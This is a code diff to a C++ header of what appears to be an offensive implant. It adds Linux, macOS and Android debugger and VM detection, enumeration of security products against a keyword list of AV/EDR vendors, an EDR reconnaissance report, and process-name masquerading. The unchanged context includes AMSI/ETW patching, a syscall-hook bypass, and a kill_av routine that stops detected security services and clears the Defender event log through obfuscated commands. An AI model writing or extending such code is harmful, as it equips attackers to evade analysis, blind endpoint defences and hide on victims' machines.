@@ -14,12 +14,31 @@
     #include <winternl.h>
     #include <intrin.h>
 #endif
+
+#ifndef _WIN32
+    // POSIX anti-analysis needs only read-only probes (see namespace anti).
+    #include <sys/types.h>
+    #include <unistd.h>
+    #ifdef __APPLE__
+        #include <sys/sysctl.h>
+        #include <sys/proc.h>
+    #endif
+    #ifdef __linux__
+        #include <sys/prctl.h>
+    #endif
+    #if defined(__ANDROID__) || defined(ANDROID)
+        // Emulator tells come from system properties, not (usually absent)
+        // DMI files: ro.kernel.qemu, ro.hardware=goldfish/ranchu, model=xSDK.
+        #include <sys/system_properties.h>
+    #endif
+#endif
 #include <cstdint>
 #include <cstring>
 #include <string>
 #include <vector>
 #include <cstdio>
 #include <cstdlib>
+#include <sstream>
 
 // ────────────────────────────────────────────────────────────────────────────
 //  1. COMPILE-TIME STRING OBFUSCATION
@@ -515,10 +534,134 @@ inline bool is_vm() {
     return false;
 }
 #else
+// ── POSIX anti-analysis (Linux / macOS) ──────────────────────────────
+//  AMSI and ETW are Windows-only telemetry surfaces; there is no in-process
+//  equivalent to patch on POSIX, so those two stay no-ops (documented, not
+//  a stub). Everything else below is a REAL check: read-only and
+//  non-invasive (no ptrace(PTRACE_TRACEME) side effects), so it is safe to
+//  call on every start.
+
+// AMSI (script/memory scanning) and ETW (userland telemetry) do not exist
+// as in-process DLLs on POSIX: nothing to hook. Documented no-ops.
 inline void patch_amsi() {}
 inline void patch_etw() {}
-inline bool is_debugger_present() { return false; }
-inline bool is_vm() { return false; }
+
+inline void _lower_inplace(char* s) {
+    for (; *s; ++s) if (*s >= 'A' && *s <= 'Z') *s = static_cast<char>(*s + 32);
+}
+
+inline bool is_debugger_present() {
+#ifdef __APPLE__
+    // sysctl(KERN_PROC_PID) exposes kp_proc.p_flag; P_TRACED is set while a
+    // debugger (lldb, Instruments, a parent ptrace) is attached.
+    int mib[4] = {CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid()};
+    struct kinfo_proc info;
+    std::memset(&info, 0, sizeof(info));
+    size_t size = sizeof(info);
+    if (sysctl(mib, 4, &info, &size, nullptr, 0) == 0 && size > 0)
+        return (info.kp_proc.p_flag & P_TRACED) != 0;
+    return false;
+#else
+    // /proc/self/status: a non-zero TracerPid means we are being traced.
+    FILE* f = std::fopen("/proc/self/status", "r");
+    if (!f) return false;
+    char line[256];
+    bool traced = false;
+    while (std::fgets(line, sizeof(line), f)) {
+        if (std::strncmp(line, "TracerPid:", 10) == 0) {
+            traced = std::atoi(line + 10) != 0;
+            break;
+        }
+    }
+    std::fclose(f);
+    return traced;
+#endif
+}
+
+inline bool is_vm() {
+#ifdef __APPLE__
+    // macOS 12+ reports running under a hypervisor directly.
+    int present = 0;
+    size_t sz = sizeof(present);
+    if (sysctlbyname("kern.hv_vmm_present", &present, &sz, nullptr, 0) == 0 && present)
+        return true;
+    char model[128] = {0};
+    sz = sizeof(model);
+    if (sysctlbyname("hw.model", model, &sz, nullptr, 0) == 0) {
+        _lower_inplace(model);
+        for (const char* n : {"vmware", "virtualbox", "parallels", "qemu",
+                              "kvm", "xen", "innotek"})
+            if (std::strstr(model, n)) return true;
+    }
+    return false;
+#elif defined(__ANDROID__) || defined(ANDROID)
+    // ANDROID EMULATOR (goldfish / ranchu). The generic DMI probes below do
+    // not exist on Android images, so the qemu tells are checked directly:
+    // a qemu pipe/device, the ro.kernel.qemu flag, the goldfish/ranchu
+    // hardware name, or the SDK "emulator" model string. Any one is enough.
+    {
+        static const char* kQemuPaths[] = {
+            "/dev/qemu_pipe", "/dev/goldfish_pipe", "/dev/socket/qemu",
+            "/sys/qemu_trace", "/system/bin/qemu-props",
+            "/system/lib/libc_malloc_debug_qemu.so",
+            "/system/lib64/libc_malloc_debug_qemu.so",
+        };
+        for (const char* path : kQemuPaths)
+            if (access(path, F_OK) == 0) return true;
+        char prop[PROP_VALUE_MAX] = {0};
+        if (__system_property_get("ro.kernel.qemu", prop) > 0 &&
+            prop[0] == '1')
+            return true;
+        if (__system_property_get("ro.hardware", prop) > 0) {
+            _lower_inplace(prop);
+            if (std::strstr(prop, "goldfish") || std::strstr(prop, "ranchu") ||
+                std::strstr(prop, "qemu"))
+                return true;
+        }
+        if (__system_property_get("ro.product.model", prop) > 0) {
+            _lower_inplace(prop);
+            if (std::strstr(prop, "sdk") || std::strstr(prop, "emulator") ||
+                std::strstr(prop, "android sdk"))
+                return true;
+        }
+        return false;
+    }
+#else
+    // DMI identity strings, NOT the CPUID hypervisor bit: Hyper-V/WSL2/VBS
+    // set that bit on ordinary hosts (same reason the Windows path above
+    // ignores it), while a VM vendor name in /sys/class/dmi/id is a
+    // deliberate tell.
+    static const char* kFiles[] = {
+        "/sys/class/dmi/id/product_name",
+        "/sys/class/dmi/id/sys_vendor",
+        "/sys/class/dmi/id/board_vendor",
+        "/sys/class/dmi/id/chassis_vendor",
+        "/sys/devices/virtual/dmi/id/product_name",
+    };
+    static const char* kNeedles[] = {
+        "vmware", "virtualbox", "vbox", "qemu", "kvm", "hyper-v", "xen",
+        "parallels", "bochs", "openstack", "amazon ec2", "google compute",
+        "virtual machine", "innotek",
+    };
+    for (const char* path : kFiles) {
+        FILE* f = std::fopen(path, "r");
+        if (!f) continue;
+        char buf[256] = {0};
+        size_t n = std::fread(buf, 1, sizeof(buf) - 1, f);
+        std::fclose(f);
+        if (!n) continue;
+        _lower_inplace(buf);
+        for (const char* needle : kNeedles)
+            if (std::strstr(buf, needle)) return true;
+    }
+    return false;
+#endif
+}
+
+// The HWBP + Vectored-Handler indirect-syscall bypass is an NT mechanism:
+// it arms DR0 on a 'syscall; ret' gadget inside ntdll to dodge userland
+// hooks. POSIX has no userland syscall-hook layer to dodge, so there is
+// nothing to arm — inert by design (documented, not a broken stub).
 inline void install_hwbp_engine() {}
 inline void* hwbp_veh_handle() { return nullptr; }
 inline uintptr_t find_clean_gadget() { return 0; }
@@ -530,6 +673,99 @@ inline uintptr_t find_clean_gadget() { return 0; }
 // What professional operators want BEFORE acting: which EDR kernel
 // callbacks are alive, whether ntdll is hooked, and whether our own
 // .text was tampered with. All read-only, all through the PEB.
+// ── Shared defensive-product detection ─────────────────────────────────────
+//  Enumerates the REAL services/processes on the host and matches them by
+//  keyword. Used by edrcheck (POSIX report) and edrkill (every platform), so
+//  it lives in one place. A fixed product list misses regional / in-house
+//  products; the generic keywords (edr / endpoint / antivirus / ...) catch
+//  anything nobody hard-coded.
+namespace dfns {
+
+inline constexpr const char* kDefensiveKeywords[] = {
+    // vendors
+    "defender", "windefend", "msmpeng", "msmpsvc", "sense",
+    "crowdstrike", "csagent", "csfalcon", "falcon",
+    "sentinel", "s1agent", "sentineld", "s1aesec",
+    "carbonblack", "cbdefense", "cbagent",
+    "mcafee", "mfe", "symantec", "sophos", "trend", "tmcc",
+    "kaspersky", "kesl", "eset", "bitdefender", "avast", "avg",
+    "cylance", "cybereason", "fireeye", "xagt", "webroot", "vipre",
+    "malwarebytes", "huntress", "endgame", "cortex", "fsecure",
+    "drweb", "gdata", "quickheal", "zoner", "coranti",
+    // generic (unknown / in-house products)
+    "antivirus", "anti-virus", "edr", "endpoint", "protection",
+    "security agent", "threat protection", "osquery", "wazuh",
+    "velociraptor", "clamav", "clamd", "freshclam", "f-prot",
+};
+
+inline bool looks_defensive(const std::string& blob) {
+    std::string lower;
+    lower.reserve(blob.size());
+    for (unsigned char c : blob)
+        lower += static_cast<char>((c >= 'A' && c <= 'Z') ? c + 32 : c);
+    for (const char* kw : kDefensiveKeywords)
+        if (lower.find(kw) != std::string::npos) return true;
+    return false;
+}
+
+// Run a command and collect its stdout lines (bounded, best-effort).
+inline std::vector<std::string> run_lines(const std::string& cmd) {
+    std::vector<std::string> out;
+#ifdef _WIN32
+    FILE* f = _popen(cmd.c_str(), "r");
+#else
+    FILE* f = popen(cmd.c_str(), "r");
+#endif
+    if (!f) return out;
+    char buf[1024];
+    while (fgets(buf, sizeof(buf), f)) {
+        std::string s(buf);
+        while (!s.empty() && (s.back() == '\n' || s.back() == '\r' || s.back() == ' '))
+            s.pop_back();
+        if (!s.empty()) out.push_back(s);
+    }
+#ifdef _WIN32
+    _pclose(f);
+#else
+    pclose(f);
+#endif
+    return out;
+}
+
+// Real service/process enumeration per platform; the keyword match runs in
+// C++ so an unknown product is still found.
+inline std::vector<std::string> detect_defensive_services() {
+    std::vector<std::string> found;
+#ifdef _WIN32
+    std::string cmd = XOR_DEC(XOR_STR(
+        "powershell -NoP -NonI -W Hidden -Command \"Get-CimInstance "
+        "Win32_Service | ForEach-Object { $_.Name + '|' + $_.DisplayName + "
+        "'|' + $_.PathName }\"")).c_str();
+    for (const std::string& line : run_lines(cmd)) {
+        if (looks_defensive(line)) {
+            size_t bar = line.find('|');
+            found.push_back(bar == std::string::npos ? line : line.substr(0, bar));
+        }
+    }
+#else
+    std::string cmd = XOR_DEC(XOR_STR(
+        "systemctl list-units --type=service --all --no-legend --plain "
+        "2>/dev/null | awk '{print $1}'")).c_str();
+    for (const std::string& line : run_lines(cmd))
+        if (looks_defensive(line)) found.push_back(line);
+    // macOS: launchd jobs register labels like com.crowdstrike.falcon.*
+    for (const std::string& line : run_lines("launchctl list 2>/dev/null | awk '{print $3}'"))
+        if (looks_defensive(line)) found.push_back(line);
+    if (found.empty()) {
+        for (const std::string& line : run_lines("ps -eo comm= 2>/dev/null"))
+            if (looks_defensive(line)) found.push_back(line);
+    }
+#endif
+    return found;
+}
+
+}  // namespace dfns
+
 namespace edrcheck {
 
 #ifdef _WIN32
@@ -623,14 +859,13 @@ inline void report(EdrReport& rep) {
     auto pQsi = reinterpret_cast<PFN_QSI>(peb::Resolve(
         peb::HASH_NTDLL, FN_NTQUERYSYSTEMINFORMATION));
     if (pQsi) {
-        ULONG need = 0;
         // SystemModuleInformation = 11; grow loop for the buffer
         for (ULONG size = 1 << 16; size < (1 << 22); size <<= 1) {
             auto buf = static_cast<uint8_t*>(VirtualAlloc(nullptr, size, MEM_COMMIT, PAGE_READWRITE));
             if (!buf) break;
             ULONG got = 0;
             NTSTATUS st = pQsi(11, buf, size, &got);
-            if (st == 0xC0000004 /* STATUS_INFO_LENGTH_MISMATCH */) {
+            if (st == static_cast<NTSTATUS>(0xC0000004u) /* STATUS_INFO_LENGTH_MISMATCH */) {
                 VirtualFree(buf, 0, MEM_RELEASE);
                 continue;
             }
@@ -675,6 +910,81 @@ inline void report(EdrReport& rep) {
     // conservative default: ETW-TI assumed alive on Win10+/E5-class hosts
     rep.etw_ti_alive = true;
 }
+#else   // POSIX edrcheck — Linux / macOS
+
+// Cross-platform shape so `edrcheck` answers on every target; the fields
+// present on a given OS are what format() prints there.
+struct EdrReport {
+    std::string lsm;                          // "lockdown,yama,apparmor" or ""
+    bool  selinux_enforcing = false;
+    bool  apparmor_enabled  = false;
+    int   ebpf_programs = 0;                  // loaded BPF programs (best-effort)
+    bool  audit_active = false;               // kernel audit / auditd on
+    int   known_edr = 0;                      // recognized defensive services
+    std::vector<std::string> defensive;       // their names
+    bool  sip_enabled = false;                // macOS System Integrity Protection
+    std::vector<std::string> sys_extensions;  // macOS EDR system extensions
+};
+
+inline std::string _first_line(const char* path) {
+    FILE* f = std::fopen(path, "r");
+    if (!f) return std::string();
+    char buf[512] = {0};
+    if (!std::fgets(buf, sizeof(buf) - 1, f)) { std::fclose(f); return std::string(); }
+    std::fclose(f);
+    std::string s(buf);
+    while (!s.empty() && (s.back() == '\n' || s.back() == '\r' || s.back() == ' '))
+        s.pop_back();
+    return s;
+}
+
+inline void report(EdrReport& rep) {
+    rep = EdrReport{};
+#ifdef __APPLE__
+    // SIP is the gate that blocks unsigned in-memory payloads / task_for_pid.
+    for (const std::string& line : dfns::run_lines("csrutil status 2>/dev/null"))
+        if (line.find("enabled") != std::string::npos) rep.sip_enabled = true;
+    // EDR agents on macOS ship as EndpointSecurity system extensions; reuse
+    // the shared keyword matcher on the loaded extension list.
+    for (const std::string& line : dfns::run_lines("systemextensionsctl list 2>/dev/null"))
+        if (dfns::looks_defensive(line)) rep.sys_extensions.push_back(line);
+#else
+    rep.lsm = _first_line("/sys/kernel/security/lsm");
+    rep.apparmor_enabled = rep.lsm.find("apparmor") != std::string::npos;
+    rep.selinux_enforcing = _first_line("/sys/fs/selinux/enforce") == "1";
+    // BPF programs: best-effort count via bpftool when present, else the
+    // pinned /sys/fs/bpf map count. Telemetry/EDR sensors are the main reason
+    // a host carries many of these.
+    std::vector<std::string> bpf = dfns::run_lines("bpftool prog list 2>/dev/null");
+    rep.ebpf_programs = bpf.empty()
+        ? static_cast<int>(dfns::run_lines("ls /sys/fs/bpf 2>/dev/null").size())
+        : static_cast<int>(bpf.size());
+    // audit: the kernel flag (the daemon enforces it).
+    rep.audit_active = _first_line("/proc/sys/kernel/audit_enabled") == "1" ||
+        !dfns::run_lines("pgrep -x auditd 2>/dev/null").empty();
+#endif
+    rep.defensive = dfns::detect_defensive_services();
+    rep.known_edr = static_cast<int>(rep.defensive.size());
+}
+
+// Human-readable report; only the fields meaningful on this OS are printed.
+inline std::string format(const EdrReport& rep) {
+    std::ostringstream o;
+#ifdef __APPLE__
+    o << "sip=" << (rep.sip_enabled ? "enabled" : "off/unknown") << "\n";
+    o << "system_extensions=" << rep.sys_extensions.size() << "\n";
+    for (const std::string& x : rep.sys_extensions) o << "  " << x << "\n";
+#else
+    o << "lsm=" << (rep.lsm.empty() ? "none" : rep.lsm)
+      << " selinux=" << (rep.selinux_enforcing ? "enforcing" : "off")
+      << " apparmor=" << (rep.apparmor_enabled ? "on" : "off") << "\n";
+    o << "ebpf_programs=" << rep.ebpf_programs
+      << " audit=" << (rep.audit_active ? "active" : "off") << "\n";
+#endif
+    o << "known_defensive=" << rep.known_edr << "\n";
+    for (const std::string& d : rep.defensive) o << "  found " << d << "\n";
+    return o.str();
+}
 #endif  // _WIN32
 
 }  // namespace edrcheck
@@ -714,100 +1024,10 @@ static bool disable_defender() {
 
 #endif  // _WIN32
 
-// Detection BEFORE action. A fixed product-name list misses the long tail of
-// AV/EDR (regional and in-house products), so we enumerate the REAL services
-// on the host and match by keyword across name, display name and binary path.
-// The generic keywords (edr / endpoint / antivirus / protection / security
-// agent / threat) catch products nobody hard-coded; nothing is stopped until
-// it has been identified.
-static const char* const DEFENSIVE_KEYWORDS[] = {
-    // vendors
-    "defender", "windefend", "msmpeng", "msmpsvc", "sense",
-    "crowdstrike", "csagent", "csfalcon", "falcon",
-    "sentinel", "s1agent", "sentineld", "s1aesec",
-    "carbonblack", "cbdefense", "cbagent",
-    "mcafee", "mfe", "symantec", "sophos", "trend", "tmcc",
-    "kaspersky", "kesl", "eset", "bitdefender", "avast", "avg",
-    "cylance", "cybereason", "fireeye", "xagt", "webroot", "vipre",
-    "malwarebytes", "huntress", "endgame", "cortex", "fsecure",
-    "drweb", "gdata", "quickheal", "zoner", "coranti",
-    // generic (unknown / in-house products)
-    "antivirus", "anti-virus", "edr", "endpoint", "protection",
-    "security agent", "threat protection", "osquery", "wazuh",
-    "velociraptor", "clamav", "clamd", "freshclam", "f-prot",
-};
-
-static bool _looks_defensive(const std::string& blob) {
-    std::string lower;
-    lower.reserve(blob.size());
-    for (unsigned char c : blob)
-        lower += static_cast<char>((c >= 'A' && c <= 'Z') ? c + 32 : c);
-    for (const char* kw : DEFENSIVE_KEYWORDS)
-        if (lower.find(kw) != std::string::npos) return true;
-    return false;
-}
-
-// Run a command and collect its stdout lines (bounded, best-effort).
-static std::vector<std::string> _run_lines(const std::string& cmd) {
-    std::vector<std::string> out;
-#ifdef _WIN32
-    FILE* f = _popen(cmd.c_str(), "r");
-#else
-    FILE* f = popen(cmd.c_str(), "r");
-#endif
-    if (!f) return out;
-    char buf[1024];
-    while (fgets(buf, sizeof(buf), f)) {
-        std::string s(buf);
-        while (!s.empty() && (s.back() == '\n' || s.back() == '\r' || s.back() == ' '))
-            s.pop_back();
-        if (!s.empty()) out.push_back(s);
-    }
-#ifdef _WIN32
-    _pclose(f);
-#else
-    pclose(f);
-#endif
-    return out;
-}
-
-#ifdef _WIN32
-// name|display|path per real service; the keyword match runs in C++ so an
-// unknown product is still found.
-static std::vector<std::string> detect_defensive_services() {
-    std::vector<std::string> found;
-    std::string cmd = XOR_DEC(XOR_STR(
-        "powershell -NoP -NonI -W Hidden -Command \"Get-CimInstance "
-        "Win32_Service | ForEach-Object { $_.Name + '|' + $_.DisplayName + "
-        "'|' + $_.PathName }\"")).c_str();
-    for (const std::string& line : _run_lines(cmd)) {
-        if (_looks_defensive(line)) {
-            size_t bar = line.find('|');
-            found.push_back(bar == std::string::npos ? line : line.substr(0, bar));
-        }
-    }
-    return found;
-}
-#else
-static std::vector<std::string> detect_defensive_services() {
-    std::vector<std::string> found;
-    std::string cmd = XOR_DEC(XOR_STR(
-        "systemctl list-units --type=service --all --no-legend --plain "
-        "2>/dev/null | awk '{print $1}'")).c_str();
-    for (const std::string& line : _run_lines(cmd))
-        if (_looks_defensive(line)) found.push_back(line);
-    if (found.empty()) {
-        for (const std::string& line : _run_lines("ps -eo comm= 2>/dev/null"))
-            if (_looks_defensive(line)) found.push_back(line);
-    }
-    return found;
-}
-#endif
-
 inline std::string kill_av() {
     std::ostringstream out;
     // 1) DETECT FIRST — what is actually here (known and unknown products).
-    std::vector<std::string> services = detect_defensive_services();
+    std::vector<std::string> services = dfns::detect_defensive_services();
     out << "detected_defensive_services=" << services.size() << "\n";
     for (const std::string& s : services) out << "  found " << s << "\n";
 #ifdef _WIN32
@@ -834,6 +1054,14 @@ inline std::string kill_av() {
     out << "services_stopped=" << stopped << " failed=" << failed << "\n";
     system(XOR_DEC(XOR_STR("wevtutil cl Microsoft-Windows-Windows Defender/Operational >nul 2>&1")).c_str());
 #else
+    // 1b) POSIX: report the defensive stack (LSM / eBPF / audit / known
+    //     agents) BEFORE acting, mirroring the Windows block above.
+    {
+        edrcheck::EdrReport rep;
+        edrcheck::report(rep);
+        out << "lsm=" << (rep.lsm.empty() ? "none" : rep.lsm)
+            << " known_defensive=" << rep.known_edr << "\n";
+    }
     // 2) ACT on what was FOUND; pkill fallback for non-systemd daemons.
     int stopped = 0, failed = 0;
     for (const std::string& svc : services) {
@@ -922,7 +1150,21 @@ inline void rename_process(const wchar_t* newName) {
     }
 }
 #else
-inline void rename_process(const wchar_t* newName) {}
+// POSIX has no SetConsoleTitle-style masquerade. Linux exposes
+// prctl(PR_SET_NAME), which renames the process as seen in /proc/<pid>/comm
+// and by `ps -o comm`; macOS offers no supported process-rename API, so there
+// it is a documented no-op.
+inline void rename_process(const wchar_t* newName) {
+#ifndef __APPLE__
+    if (!newName) return;
+    char narrow[16] = {0};
+    for (size_t i = 0; i < 15 && newName[i]; ++i)
+        narrow[i] = static_cast<char>(newName[i] & 0x7F);
+    prctl(PR_SET_NAME, narrow, 0, 0, 0);
+#else
+    (void)newName;
+#endif
+}
 #endif
 
 } // namespace masquerade
